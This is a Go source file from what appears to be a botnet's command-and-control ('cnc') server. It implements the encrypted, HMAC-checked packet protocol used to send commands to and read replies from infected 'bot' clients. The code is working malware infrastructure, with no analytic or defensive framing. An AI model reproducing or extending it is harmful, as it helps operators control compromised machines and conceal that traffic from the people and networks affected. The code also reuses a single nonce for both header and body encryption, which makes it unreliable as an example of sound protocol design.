package clients

import (
	"bytes"
	"cnc/internal/clients/encryption"
	"cnc/internal/clients/packet"
	"encoding/binary"
	"fmt"
	"time"
)

func (bot *Bot) Transmit(op uint8, packet *packet.Packet) error {
	var buf = new(bytes.Buffer)
	defer buf.Reset()

	// Creates a header
	var header = &Header{
		Op:  uint8(op),
		Len: packet.Size(),
	}

	// If we're in a state where we can encrypt stuff, we'll do that.
	if bot.State >= StateVerifyExchange {
		var encryptedHeader = encryption.Chacha20Encrypt(bot.Key, 1, bot.Nonce, header.Bytes())
		var encryptedBody = encryption.Chacha20Encrypt(bot.Key, 1, bot.Nonce, packet.Bytes())

		// Write in header
		_, _ = buf.Write(encryption.HmacSha256(bot.Key, encryptedHeader))
		_, _ = buf.Write(encryptedHeader)

		// If we have a body, we'll add it
		if packet.Size() > 0 {
			_, _ = buf.Write(encryption.HmacSha256(bot.Key, encryptedBody))
			_, _ = buf.Write(encryptedBody)
		}

		_, err := bot.Conn.Write(buf.Bytes())
		return err
	}

	// Write in header un-encrypted
	_, _ = buf.Write(encryption.HmacSha256(emptyKey, header.Bytes()))
	_, _ = buf.Write(header.Bytes())

	// If we have a body, we'll add it but un-encrypted
	if packet.Size() > 0 {
		_, _ = buf.Write(encryption.HmacSha256(emptyKey, packet.Bytes()))
		_, _ = buf.Write(packet.Bytes())
	}

	// Actually write it now
	_, err := bot.Conn.Write(buf.Bytes())
	return err
}

func (bot *Bot) Read(op int8) (*Header, *packet.Parser, error) {
	hdr, err := bot.readHeader()
	if err != nil {
		return nil, nil, err
	}

	if op != -1 && hdr.Op != uint8(op) {
		return nil, nil, fmt.Errorf("%w: expected: %d, received: %d", ErrInvalidOpcode, op, hdr.Op)
	}

	parser, err := bot.readBody(hdr)
	if err != nil {
		return nil, nil, err
	}

	return hdr, parser, nil
}

// readHeader reads and processes the header
func (bot *Bot) readHeader() (*Header, error) {
	headerBytes := make([]byte, HeaderSize)
	header := new(Header)

	// Attempt to read the hash header
	hash, err := bot.ReadHash()
	if err != nil {
		return nil, err
	}

	// Read in header bytes
	n, err := bot.Conn.Read(headerBytes)
	if err != nil {
		return nil, err
	}

	// Check if we received the right amount of bytes
	if n < HeaderSize {
		return nil, fmt.Errorf("%w: header: expected: %d, received: %d", ErrLengthMismatch, HeaderSize, n)
	}

	// Check if data wasn't corrupted
	if !bytes.Equal(encryption.HmacSha256(bot.Key, headerBytes), hash) {
		return nil, fmt.Errorf("%w: header", ErrHashMismatch)
	}

	// Check if we can decrypt the header bytes
	if bot.IsTrafficEncrypted() {
		encryption.Chacha20(bot.Key, 1, bot.Nonce, headerBytes, headerBytes)
	}

	// Actually read in header
	if err := binary.Read(bytes.NewBuffer(headerBytes), binary.BigEndian, header); err != nil {
		return nil, err
	}

	_ = bot.Conn.SetReadDeadline(time.Now().Add(PingTimeout * time.Second))
	return header, nil
}

// readBody reads and processes the body
func (bot *Bot) readBody(hdr *Header) (*packet.Parser, error) {
	if hdr.Len == 0 {
		return nil, nil
	}

	// Preserve right amount of bytes
	bodyBytes := make([]byte, hdr.Len)

	// Attempt to read the hash header
	hash, err := bot.ReadHash()
	if err != nil {
		return nil, err
	}

	// Read in the body bytes
	n, err := bot.Conn.Read(bodyBytes)
	if err != nil {
		return nil, err
	}

	// Check if we received the right amount of bytes
	if n < int(hdr.Len) {
		return nil, fmt.Errorf("%w: body: expected: %d, received: %d", ErrLengthMismatch, hdr.Len, n)
	}

	// Check if data wasn't corrupted
	if !bytes.Equal(encryption.HmacSha256(bot.Key, bodyBytes), hash) {
		return nil, fmt.Errorf("%w: body", ErrHashMismatch)
	}

	// Check if we can decrypt the header bytes
	if bot.IsTrafficEncrypted() {
		encryption.Chacha20(bot.Key, 1, bot.Nonce, bodyBytes, bodyBytes)
	}

	// Parse body
	return packet.NewParser(bodyBytes), nil
}

func (bot *Bot) ReadHash() ([]byte, error) {
	var temp = make([]byte, 32)

	n, err := bot.Conn.Read(temp)
	if err != nil || n <= 0 {
		return nil, err
	}

	return temp, err
}
